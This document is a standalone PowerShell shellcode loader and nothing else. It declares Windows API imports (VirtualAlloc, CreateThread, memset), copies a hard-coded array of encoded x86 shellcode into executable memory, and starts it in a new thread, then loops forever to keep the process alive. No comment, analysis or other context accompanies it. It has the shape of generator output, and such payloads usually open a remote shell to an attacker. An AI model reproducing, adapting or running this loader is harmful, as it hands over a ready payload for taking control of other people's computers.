$oLpg = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $oLpg -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xbb,0xd3,0x00,0xee,0xd9,0xcd,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x03,0x5a,0x13,0x83,0xc2,0xbf,0x31,0xf5,0x12,0x57,0x37,0xf6,0xea,0xa7,0x58,0x7e,0x0f,0x96,0x58,0xe4,0x5b,0x88,0x68,0x6e,0x09,0x24,0x02,0x22,0xba,0xbf,0x66,0xeb,0xcd,0x08,0xcc,0xcd,0xe0,0x89,0x7d,0x2d,0x62,0x09,0x7c,0x62,0x44,0x30,0x4f,0x77,0x85,0x75,0xb2,0x7a,0xd7,0x2e,0xb8,0x29,0xc8,0x5b,0xf4,0xf1,0x63,0x17,0x18,0x72,0x97,0xef,0x1b,0x53,0x06,0x64,0x42,0x73,0xa8,0xa9,0xfe,0x3a,0xb2,0xae,0x3b,0xf4,0x49,0x04,0xb7,0x07,0x98,0x55,0x38,0xab,0xe5,0x5a,0xcb,0xb5,0x22,0x5c,0x34,0xc0,0x5a,0x9f,0xc9,0xd3,0x98,0xe2,0x15,0x51,0x3b,0x44,0xdd,0xc1,0xe7,0x75,0x32,0x97,0x6c,0x79,0xff,0xd3,0x2b,0x9d,0xfe,0x30,0x40,0x99,0x8b,0xb6,0x87,0x28,0xcf,0x9c,0x03,0x71,0x8b,0xbd,0x12,0xdf,0x7a,0xc1,0x45,0x80,0x23,0x67,0x0d,0x2c,0x37,0x1a,0x4c,0x38,0xf4,0x17,0x6f,0xb8,0x92,0x20,0x1c,0x8a,0x3d,0x9b,0x8a,0xa6,0xb6,0x05,0x4c,0xc9,0xec,0xf2,0xc2,0x34,0x0f,0x03,0xca,0xf2,0x5b,0x53,0x64,0xd3,0xe3,0x38,0x74,0xdc,0x31,0xd4,0x71,0x4a,0x7a,0x81,0x7a,0x9b,0x12,0xd0,0x7a,0x8a,0xbe,0x5d,0x9c,0xfc,0x6e,0x0e,0x31,0xbc,0xde,0xee,0xe1,0x54,0x35,0xe1,0xde,0x44,0x36,0x2b,0x77,0xee,0xd9,0x82,0x2f,0x86,0x40,0x8f,0xa4,0x37,0x8c,0x05,0xc1,0x77,0x06,0xaa,0x35,0x39,0xef,0xc7,0x25,0xad,0x1f,0x92,0x14,0x7b,0x1f,0x08,0x32,0x83,0xb5,0xb7,0x95,0xd4,0x21,0xba,0xc0,0x12,0xee,0x45,0x27,0x29,0x27,0xd0,0x88,0x45,0x48,0x34,0x09,0x95,0x1e,0x5e,0x09,0xfd,0xc6,0x3a,0x5a,0x18,0x09,0x97,0xce,0xb1,0x9c,0x18,0xa7,0x66,0x36,0x71,0x45,0x51,0x70,0xde,0xb6,0xb4,0x80,0x22,0x61,0xf0,0xf6,0x4a,0xb1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$4VId=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($4VId.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$4VId,0,0,0);for (;;){Start-sleep 60};